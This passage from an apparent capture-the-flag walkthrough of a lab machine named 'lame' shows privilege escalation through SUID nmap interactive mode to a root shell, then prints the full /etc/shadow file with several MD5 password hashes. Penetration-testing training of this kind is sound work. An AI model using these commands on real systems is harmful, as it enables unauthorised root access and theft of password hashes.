daemon@lame:/dev/shm$ nmap --interactive
nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
sh-3.2# id
id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
sh-3.2# 
```

Let's dump the hashed credentials on the box

```
sh-3.2# cat /etc/shadow
root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$NsRwcGHl$euHtoVjd59CxMcIasiTw/.:17239:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$dwLrUikz$LRJRShCPfPyYb3r6pinyM.:17239:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
service:$1$cwdqim5m$bw71JTFHNWLjDTmYTNN9j/:17239:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::
snmp:*:15480:0:99999:7:::
makis:$1$Yp7BAV10$7yHWur1KMMwK5b8KRZ2yK.:17239:0:99999:7:::
```